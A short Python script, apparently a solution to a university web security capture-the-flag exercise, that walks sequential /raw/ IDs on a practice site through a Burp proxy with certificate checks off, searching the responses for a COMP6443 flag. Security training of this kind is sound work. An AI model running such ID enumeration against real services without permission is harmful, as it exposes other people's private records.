import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urljoin

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

s = requests.session()
s.verify = False
# Comment out proxies if you don't need to see every request in Burp
s.proxies = {"https": "http://127.0.0.1:8080"}

base_url = "https://support-v0.quoccacorp.com"

for i in range(281):
    url = urljoin(base_url, f"/raw/{i}")
    r = s.get(url)
    
    if "COMP6443{" in r.text:
        flag = re.search(r"COMP6443\{.*?\}", r.text).group(0)
        print(f"\n\n[!] FLAG FOUND at {url}: {flag}")
        break